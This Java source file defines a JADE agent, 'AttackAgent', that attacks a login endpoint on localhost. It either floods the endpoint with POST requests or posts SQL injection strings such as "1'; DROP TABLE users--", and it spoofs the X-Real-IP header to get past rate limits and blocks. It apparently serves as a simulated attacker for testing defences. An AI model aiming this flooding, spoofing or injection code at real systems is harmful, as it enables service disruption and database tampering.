package agentes;

import jade.core.Agent;
import jade.core.behaviours.*;
import jade.lang.acl.ACLMessage;
import jade.domain.DFService;
import jade.domain.FIPAAgentManagement.*;
import jade.domain.FIPAException;
import jade.domain.FIPANames;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class AttackAgent extends Agent {
    private static final int DOS = 0;
    private static final int INJECTION = 1;
    private static final String TARGET_URL = "http://localhost:8080/login";

    private boolean notifiedCreate = false;
    private final String fakeIp;

    public AttackAgent() {
        this.fakeIp = String.format("10.0.%d.%d", new Random().nextInt(256), new Random().nextInt(256));
    }

    protected void setup() {
        System.out.println(getLocalName() + ": inicializado com IP fake = " + fakeIp);

        int tipoAtaque = new Random().nextInt(2);

        if (tipoAtaque == DOS) {
            System.out.println(getLocalName() + ": Tipo selecionado = DoS");
            addBehaviour(new DosBehaviour(this, 300, fakeIp));
        } else {
            System.out.println(getLocalName() + ": Tipo selecionado = Injection");
            addBehaviour(new InjectionBehaviour(this, 2000, fakeIp));
        }   
    }

    protected void takeDown() {
        if (!notifiedCreate) {
            notifiedCreate = true;
            System.out.println("[ATTACK] " + getLocalName() + " sendo encerrado. Notificando CreateAttackAgent...");
            try {
                DFAgentDescription template = new DFAgentDescription();
                ServiceDescription sd = new ServiceDescription();
                sd.setType("Create-Attack");
                template.addServices(sd);

                DFAgentDescription[] result = DFService.search(this, template);
                if (result.length > 0) {
                    ACLMessage msg = new ACLMessage(ACLMessage.REQUEST);
                    msg.addReceiver(result[0].getName());
                    msg.setProtocol(FIPANames.InteractionProtocol.FIPA_REQUEST);
                    msg.setContent("criar");
                    send(msg);
                    System.out.println("[ATTACK] Mensagem enviada ao CreateAttackAgent.");
                } else {
                    System.out.println("[ATTACK] CreateAttackAgent não encontrado.");
                }
            } catch (FIPAException e) {
                e.printStackTrace();
            }
        }
        super.takeDown();
    }


    private class InjectionBehaviour extends TickerBehaviour {
            private final String fakeIp;  

        public InjectionBehaviour(Agent a, long period, String fakeIp) {
            super(a, period);
            this.fakeIp = fakeIp;
        }
        public void onTick() {
            try {
                URL url = new URL(TARGET_URL);
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("X-Real-IP", this.fakeIp); 
                con.setDoOutput(true);

                // Gera payloads variados
                String[] payloads = {
    "admin' --",
    "' OR '1'='1",
    "\" OR \"\"=\"",
    "1'; DROP TABLE users--",
    "admin'/*"
};
                String payload = payloads[new Random().nextInt(payloads.length)];
                
String json = String.format(
    "{\"username\":\"%s\",\"password\":\"%s\"}", 
    payload.replace("\"", "\\\""),  
    "hacked_password"
);
                    System.out.println("Iniciando ataque Injection com: " + payload);
                try (OutputStream os = con.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }

                // Lê resposta
                try (BufferedReader br = new BufferedReader(
                    new InputStreamReader(con.getInputStream()))) {
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) {
                        response.append(line);
                    }
                    System.out.println("Resposta: " + response);
                }
                
            } catch (Exception e) {
                System.err.println("Erro no ataque: " + e.getMessage());
                myAgent.doDelete();
            } 
        }
    }


     private static class DosBehaviour extends TickerBehaviour {
    private final String fakeIp;
    private static final int MAX_ATTEMPTS = 50;
    private int failedAttempts = 0;
    private boolean shouldTerminate = false;

    public DosBehaviour(Agent a, long period, String fakeIp) {
        super(a, period);
        this.fakeIp = fakeIp;
    }

    protected void onTick() {
        if (shouldTerminate) {
            terminateAgent();
            return;
        }

        if (failedAttempts >= MAX_ATTEMPTS) {
            System.out.println("[" + getAgent().getLocalName() + "-DoS] Máximo de tentativas alcançado");
            shouldTerminate = true;
            terminateAgent();
            return;
        }

        try {
            URL url = new URL(TARGET_URL);
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            
            con.setRequestMethod("POST");
            con.setRequestProperty("X-Real-IP", this.fakeIp);
            con.setDoOutput(true);
            
            try (OutputStream os = con.getOutputStream()) {
                String json = "{\"username\":\"user\",\"password\":\"pass\"}";
                os.write(json.getBytes(StandardCharsets.UTF_8));
            }

            int code = con.getResponseCode();
            
            if (code == 429) { // Too Many Requests
                System.out.println("[" + getAgent().getLocalName() + "-DoS] IP limitado: " + fakeIp);
                shouldTerminate = true;
                terminateAgent();
                return;
            } 
            else if (code == 403) { // Forbidden
                System.out.println("[" + getAgent().getLocalName() + "-DoS] IP bloqueado: " + fakeIp);
                shouldTerminate = true;
                terminateAgent();
                return;
            }
            else if (code >= 400 && code != 429 && code != 403) {
                System.err.println("[" + getAgent().getLocalName() + "-DoS] Erro no servidor: " + code);
                failedAttempts++;
            }
            else {
                System.out.println("[" + getAgent().getLocalName() + "-DoS] Requisição enviada. Código: " + code);
            }
            
            con.disconnect();
            
        } catch (Exception e) {
            System.err.println("[" + getAgent().getLocalName() + "-DoS] Erro inesperado: " + e.getMessage());
            failedAttempts++;
            
            if (failedAttempts >= MAX_ATTEMPTS) {
                shouldTerminate = true;
                terminateAgent();
            }
        }
    }

    private void terminateAgent() {
        stop(); 
        getAgent().doDelete(); 
    }
}
}









